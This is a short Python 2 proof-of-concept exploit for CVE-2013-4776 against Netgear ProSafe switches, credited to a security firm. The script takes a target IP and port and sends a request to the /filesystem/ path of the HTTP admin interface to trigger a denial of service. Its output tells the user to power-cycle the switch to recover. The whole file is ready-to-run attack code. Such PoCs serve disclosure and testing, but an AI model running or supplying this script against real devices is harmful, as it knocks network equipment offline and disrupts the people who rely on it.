#!/usr/bin/python

################################################################
#                                                              #
# Netgear ProSafe - CVE-2013-4776 PoC                          #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013 Encripto AS. All rights reserved.             #
#                                                              #
# This software is licensed under the FreeBSD license.         #
# http://www.encripto.no/tools/license.php                     #
#                                                              #
################################################################

import sys, getopt, urllib2
from subprocess import *


__version__ = "0.1"
__author__ = "Juan J. Guelfo, Encripto AS (post@encripto.no)"


# Prints title and other header info
def header():
    print ""
    print " ================================================================= "
    print "|  Netgear ProSafe - CVE-2013-4776 PoC \t\t\t\t  |".format(__version__)
    print "|  by {0}\t\t  |".format(__author__)
    print " ================================================================= "
    print ""

    
# Prints help    
def help():
    header()
    print """
   Usage: python CVE-2013-4776.py [mandatory options]

   Mandatory options:
       -t target               ...Target IP address
       -p port                 ...Port where the HTTP admin interface is listening on
        
   Example:
       python CVE-2013-4776.py -t 192.168.0.1 -p 80
    """
    sys.exit(0) 

    
if __name__ == '__main__':
    
    #Parse options
    try:
        options, args = getopt.getopt(sys.argv[1:], "t:p:", ["target=", "port="])

    except getopt.GetoptError, err:
        header()
        print "\n[-] Error: {0}.\n".format(str(err))
        sys.exit(1)
    
    if not options:
        help()
    
    target = None
    port = None
    for opt, arg in options:
        if opt in ("-t"):
            target = arg
        
        if opt in ("-p"):
            port = arg    
            
    #Option input validation
    if not target or not port:
        help()
        print "[-] Error: Incorrect syntax.\n"
        sys.exit(1)
    
    header()
    headers = { "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)" }

    try:
        # Get the startup config via HTTP admin interface
        print "[+] Triggering DoS condition..."
        r = urllib2.Request('http://%s:%s/filesystem/' % (target, port), None, headers)
        urllib2.urlopen(r,"",5).read()
    
    except urllib2.URLError:
        print "[-] Error: The connection could not be established.\n"
        
    except:
        print "[+] The switch should be freaking out..."
        print "[+] Reboot the switch (unplug the power cord) to get it back to normal...\n"

    sys.exit(0)